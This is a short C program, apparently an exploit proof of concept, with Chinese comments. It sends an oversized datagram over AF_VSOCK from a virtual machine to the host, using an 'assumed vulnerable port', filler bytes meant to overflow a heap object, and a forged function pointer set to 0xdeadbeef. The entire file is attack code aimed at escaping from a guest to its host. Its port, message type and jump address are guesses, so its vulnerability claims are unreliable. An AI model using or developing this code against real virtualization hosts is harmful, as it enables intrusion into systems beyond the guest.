#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <linux/vm_sockets.h>
#include <unistd.h>

int main() {
    int sock = socket(AF_VSOCK, SOCK_DGRAM, 0); // 使用DGRAM触发特定处理
    struct sockaddr_vm addr = {0};
    addr.svm_family = AF_VSOCK;
    addr.svm_cid = VMADDR_CID_HOST;
    addr.svm_port = 0x1234; // 假设漏洞端口

    // 构造payload：头部+溢出数据
    char buf[8192];
    memset(buf, 0, sizeof(buf));
    // 填充头部（假设消息类型等）
    *(int*)buf = 0x1; // 消息类型
    // 溢出数据：覆盖堆对象
    for (int i = 100; i < 200; i++) {
        *(long*)(buf + i*8) = 0x4141414141414141; // 填充
    }
    // 伪造函数指针
    *(long*)(buf + 0x200) = 0xdeadbeef; // 跳转地址

    sendto(sock, buf, sizeof(buf), 0, (struct sockaddr*)&addr, sizeof(addr));
    close(sock);
    return 0;
}

